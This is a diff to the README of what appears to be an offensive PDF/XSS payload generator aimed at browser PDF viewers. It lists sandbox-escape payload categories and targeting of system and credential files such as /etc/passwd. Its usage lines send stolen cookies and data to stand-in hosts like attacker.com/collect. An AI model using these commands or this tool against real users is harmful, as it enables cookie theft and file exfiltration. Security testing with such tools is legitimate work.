@@ -4,6 +4,18 @@
 
 A research-grade tool for generating PDF files with sophisticated JavaScript payloads designed to escape PDF sandbox restrictions across all major browser PDF libraries. Features 1000+ distinct payloads targeting Chrome (PDFium), Firefox (PDF.js), Safari (PDFKit), Adobe Reader, and Edge PDF.
 
+## 📁 Project Structure
+
+```
+XSS-PDF/
+├── PDF/                          # Main PDF generation tools
+│   ├── script.py                 # Advanced XSS-PDF Generator v2.0 (1000+ payloads)
+│   ├── Another-Script.py         # Browser-specific PDF generator
+│   └── Files/                    # Generated PDF files output directory
+├── README.md                     # This file
+└── other files...
+```
+
 ## ⚠️ Legal Disclaimer
 
 This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.
@@ -31,6 +43,20 @@ This tool is designed for legitimate security testing, educational purposes, and
 - **Browser-Optimized PDF Objects**: Different PDF versions and structures per browser
 - **Enhanced Cross-Reference Tables**: Proper offset calculations and object references
 - **Font Resources**: Complete font dictionaries to prevent rendering issues
+- **Complete Payload Visibility**: Full payload content displayed in PDF for reference
+- **Filename Integration**: PDF filename shown as heading for easy identification
+
+### OS-Aware File System Targeting
+- **Windows**: Targets `C:\Windows\System32\`, `C:\Users\`, etc.
+- **macOS**: Targets `/Applications/`, `/Users/`, `/System/`, etc.
+- **Linux**: Targets `/etc/passwd`, `/home/`, `/usr/bin/`, etc.
+- **Android**: Targets `/system/`, `/data/`, Android-specific paths
+- **Automatic Detection**: Scripts detect running OS and use appropriate file paths
+
+### Enhanced Security & Compatibility
+- **Parent Object Checks**: All payloads include proper checks for `parent`, `top`, `frames` objects
+- **Cross-Browser Compatibility**: Handles different JavaScript contexts safely
+- **Error Handling**: Graceful fallbacks when objects are undefined
 
 ### Payload Categories
 - **DOM Access**: Browser DOM manipulation from PDF context
@@ -54,6 +80,9 @@ This tool is designed for legitimate security testing, educational purposes, and
 
 ### Basic Usage
 ```bash
+# Navigate to the PDF directory
+cd PDF
+
 # Generate Chrome-specific payloads
 python3 script.py -b chrome -u http://attacker.com/collect
 
@@ -69,6 +98,9 @@ python3 script.py -b adobe --count 50 -u http://collector.com
 
 ### Advanced Usage
 ```bash
+# Navigate to the PDF directory first
+cd PDF
+
 # Export payload database as JSON
 python3 script.py -b all --output-json
 
@@ -80,6 +112,9 @@ python3 script.py --list-research
 
 # Filter by specific categories
 python3 script.py -b chrome --category command_execution -u http://log.site
+
+# Use the alternative script for browser-specific PDFs
+python3 Another-Script.py -b chrome -u http://test.com
 ```
 
 ## 🎯 Browser Targets
@@ -111,7 +146,7 @@ python3 script.py -b chrome --category command_execution -u http://log.site
 ### Installation
 ```bash
 git clone https://github.com/SNGWN/XSS-PDF.git
-cd XSS-PDF
+cd XSS-PDF/PDF  # Note: Scripts are now in the PDF folder
 ```
 
 ## 📖 Usage
@@ -119,6 +154,9 @@ cd XSS-PDF
 ### Basic Commands
 
 ```bash
+# Navigate to the PDF directory
+cd PDF
+
 # Show help and available options
 python3 script.py --help
 
@@ -141,6 +179,9 @@ python3 script.py -o html
 ### Advanced PDF Sandbox Escape Usage
 
 ```bash
+# Navigate to PDF directory first
+cd PDF
+
 # PDF data exfiltration via form submission escape
 python3 script.py -t cookie -u http://attacker.com/collect
 
